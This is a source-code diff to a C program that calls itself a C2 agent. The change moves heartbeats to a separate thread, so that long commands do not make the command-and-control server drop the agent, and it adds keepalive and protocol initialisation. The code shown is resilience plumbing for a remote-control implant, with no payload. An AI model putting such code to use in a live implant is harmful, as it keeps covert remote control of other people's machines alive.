@@ -351,6 +351,47 @@ static int send_heartbeat_pkt(sockfd_t sock, uint64_t req_id) {
     return rc;
 }
 
+/* ===================================================================== */
+/* heartbeat thread                                                      */
+/*                                                                       */
+/* Runs independently of command execution so a long-running command on   */
+/* the serve thread cannot starve heartbeats (the C2 watchdog would       */
+/* otherwise drop the agent).                                            */
+/* ===================================================================== */
+
+typedef struct {
+    sockfd_t     sock;
+    int          interval; /* seconds */
+    volatile int stop;
+} hb_ctx;
+
+#ifdef _WIN32
+#define HB_THREAD_RET DWORD WINAPI
+#else
+#define HB_THREAD_RET void *
+#endif
+
+static HB_THREAD_RET hb_thread(void *arg) {
+    hb_ctx *c = (hb_ctx *)arg;
+    uint64_t req = 3; /* 1 = register, 2 = register_confirm */
+    while (!c->stop) {
+        int waited = 0;
+        int total = c->interval * 1000;
+        /* Sleep in short slices so shutdown does not wait a whole interval. */
+        while (waited < total && !c->stop) {
+            sleep_sec(0.2);
+            waited += 200;
+        }
+        if (c->stop) break;
+        if (send_heartbeat_pkt(c->sock, req++) != 0) break;
+    }
+#ifdef _WIN32
+    return 0;
+#else
+    return NULL;
+#endif
+}
+
 static int send_response_pkt(sockfd_t sock, uint64_t req_id, uint8_t cmd,
                              const char *result, size_t len) {
     uint32_t plen = 0;
@@ -551,10 +592,7 @@ static int dispatch(sockfd_t sock, bytebuf_t *inbuf, const opts *o, int *shutdow
 /* ===================================================================== */
 
 static int serve(sockfd_t sock, const opts *o, bytebuf_t *inbuf, int *shutdown_flag) {
-    uint64_t next_req = 3; /* 1 = register, 2 = register_confirm */
-    int64_t last_hb = now_ms();
     int ret = 0;
-
     for (;;) {
         uint64_t req_id;
         uint8_t cmd;
@@ -567,26 +605,8 @@ static int serve(sockfd_t sock, const opts *o, bytebuf_t *inbuf, int *shutdown_f
             if (ret != 0) break;
             continue;
         }
-        int64_t now = now_ms();
-        int64_t hb_ms = (int64_t)o->heartbeat_interval * 1000;
-        int64_t wait_ms = hb_ms - (now - last_hb);
-        if (wait_ms <= 0) {
-            if (send_heartbeat_pkt(sock, next_req++) != 0) { ret = -1; break; }
-            last_hb = now_ms();
-            continue;
-        }
-        int wait_int = wait_ms > 2000000000 ? 2000000000 : (int)wait_ms;
-        int sel = wait_sock(sock, wait_int);
-        if (sel > 0) {
-            int r = recv_more(sock, inbuf);
-            if (r <= 0) { ret = -1; break; }
-        } else if (sel == 0) {
-            if (send_heartbeat_pkt(sock, next_req++) != 0) { ret = -1; break; }
-            last_hb = now_ms();
-        } else {
-            ret = -1;
-            break;
-        }
+        /* Heartbeats are sent by hb_thread; just block for the next packet. */
+        if (recv_more(sock, inbuf) <= 0) { ret = -1; break; }
     }
     return ret;
 }
@@ -610,6 +630,7 @@ static int run(const opts *o) {
             continue;
         }
         fprintf(stderr, "[c2agent] connected to %s:%d\n", o->c2_host, o->c2_port);
+        set_keepalive(sock);
         /* Reset any leftover encryption state from a previous connection; the
          * register packet must be sent in plaintext. auth_handshake re-enables
          * ChaCha20 once the challenge is verified (before the confirm). */
@@ -627,7 +648,28 @@ static int run(const opts *o) {
         /* Successful handshake: reset the backoff. */
         delay = (double)o->reconnect_initial;
         if (delay < 1.0) delay = 1.0;
+
+        /* Heartbeats run on their own thread; the stream is encrypted now. */
+        hb_ctx hb;
+        hb.sock = sock;
+        hb.interval = o->heartbeat_interval;
+        hb.stop = 0;
+#ifdef _WIN32
+        HANDLE hb_handle = CreateThread(NULL, 0, hb_thread, &hb, 0, NULL);
+#else
+        pthread_t hb_handle;
+        pthread_create(&hb_handle, NULL, hb_thread, &hb);
+#endif
+
         int ret = serve(sock, o, &inbuf, &shutdown_flag);
+
+        hb.stop = 1;
+#ifdef _WIN32
+        if (hb_handle) { WaitForSingleObject(hb_handle, INFINITE); CloseHandle(hb_handle); }
+#else
+        pthread_join(hb_handle, NULL);
+#endif
+
         bb_free(&inbuf);
         sock_close(sock);
         if (shutdown_flag) {
@@ -679,6 +721,8 @@ int main(int argc, char **argv) {
 #else
     signal(SIGPIPE, SIG_IGN);
 #endif
+
+    proto_global_init();
 
     opts o;
     opts_init(&o);
